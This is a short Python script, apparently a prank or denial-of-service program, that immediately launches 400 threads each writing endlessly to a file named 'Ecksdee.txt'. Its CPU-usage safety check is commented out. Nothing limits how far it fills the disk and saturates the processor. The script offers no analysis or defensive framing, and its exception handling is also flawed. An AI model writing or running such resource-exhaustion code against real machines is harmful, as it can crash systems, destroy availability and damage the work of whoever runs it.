import os
import psutil
import threading
from cryptography.fernet import Fernet

class CPU_Consumer:
    def CompoundWrite(x):
        for i in range(4300):
            try:
                while True:
                        z = "\n"
                        z = bytes(z, 'utf-8')
                        with open("Ecksdee.txt", "a+") as Ecksdee:
                            Ecksdee.write(str(z))
                            Sex = Ecksdee.write(str(z))
                            Lmao = Ecksdee.readlines()
                            Lmao.append(Sex)
                            #CPU_Usage = psutil.cpu_percent()
                            #if CPU_Usage >= 80:
                            #    exit()   
            except ValueError or OSError:
                pass

    def __init__(self):
        for i in range(100):
            t1 = threading.Thread(target=self.CompoundWrite)
            t1.start()

            t2 = threading.Thread(target=self.CompoundWrite)
            t2.start()

            t3 = threading.Thread(target=self.CompoundWrite)
            t3.start()

            t4 = threading.Thread(target=self.CompoundWrite)
            t4.start()
CPU_Consumer()
